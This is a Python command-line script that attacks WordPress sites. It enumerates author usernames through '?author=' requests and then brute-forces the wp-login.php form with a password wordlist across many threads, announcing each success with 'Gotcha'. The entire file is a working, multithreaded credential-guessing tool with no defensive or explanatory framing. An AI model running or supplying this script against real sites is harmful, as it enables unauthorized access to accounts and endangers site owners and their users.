import click
import requests
import concurrent.futures
from bs4 import BeautifulSoup

@click.command()
@click.option('-u', '--username', help='Specify the Username')
@click.option('-w', '--wordlist', help='Wordlist file [password]')
@click.option('-t', '--threads', help='Number of threads', default=25)
@click.argument('url')

def main(url, username, wordlist, threads):
	if not url.startswith('http') and url[-1] != '/':
		url = 'http://%s/' % url
	elif not url.startswith('http'):
		url = 'http://%s' % url
	elif url[-1] != '/':
		url = '%s/' % url

	if username is None and wordlist is None:
		get_username(url, threads)
	elif username != None and wordlist is None:
		print('Select wordlist file !')
		exit(1)
	elif username is None and wordlist != None:
		print('Specify the username')
		exit(1)
	elif username != None and wordlist != None:
		get_password(url, username, threads, wordlist)

def get_username(url, threads):
	def load_url(num):
		r = requests.get(f'{url}?author={num}')
		
		return r.text

	with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as e:
		futures = {e.submit(load_url, num): num for num in range(25)}
		for future in concurrent.futures.as_completed(futures):
			result = future.result()

			soup = BeautifulSoup(result, 'html.parser')

			for span in soup.find_all('span', class_='vcard'):
				print('Gotcha :', span.text)

def get_password(url, username, threads, wordlist):
	wls = open(wordlist, 'r')

	def load_url(wl):
		wl = wl.strip()
		x = requests.post(f'{url}wp-login.php', data={'log': username, 'pwd': wl})

		return x.url

	with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as e:
		futures = {e.submit(load_url, wl): wl.strip() for wl in wls}
		for future in concurrent.futures.as_completed(futures):
			result = future.result()
			passd = futures[future]

			if result == f'{url}wp-login.php':
				print('Try :', passd)
			else:
				print('\033[2;32;49mGotcha :', passd)
				break

if __name__ == '__main__':
	main()